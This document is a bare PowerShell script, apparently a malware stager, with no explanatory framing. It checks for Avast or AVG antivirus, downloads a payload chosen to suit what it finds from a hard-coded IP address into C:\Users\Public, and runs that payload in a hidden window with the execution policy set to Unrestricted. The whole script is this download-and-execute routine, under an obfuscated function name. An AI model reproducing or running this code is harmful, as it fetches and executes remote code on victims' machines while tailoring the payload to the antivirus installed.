Function Froool_tyhn
{

$Nod32 = "C:\Program Files\Avast Software\Avast\AvastUI.exe"

if([System.IO.File]::Exists($Nod32)){

$url = "http://54.241.113.239/avast/Avast.txt" 
$path = "C:\Users\Public\Untitled.ps1" 
# param([string]$url, [string]$path) 

if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 

(New-Object Net.WebClient).DownloadFile($url, $path) 
$path

powershell -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "C:\Users\Public\Untitled.ps1"

}



elseif([System.IO.File]::Exists("C:\Program Files\AVG\Antivirus\AVGUI.exe")){

$url = "http://54.241.113.239/avast/Avast.txt" 
$path = "C:\Users\Public\Untitled.ps1" 
# param([string]$url, [string]$path) 

if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 

(New-Object Net.WebClient).DownloadFile($url, $path) 
$path



powershell -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "C:\Users\Public\Untitled.ps1"




}






else{

$url = "http://54.241.113.239/avast/All.txt" 
$path = "C:\Users\Public\Untitled.ps1" 
# param([string]$url, [string]$path) 

if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 

(New-Object Net.WebClient).DownloadFile($url, $path) 
$path
}



powershell -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "C:\Users\Public\Untitled.ps1"




}
IEX Froool_tyhn

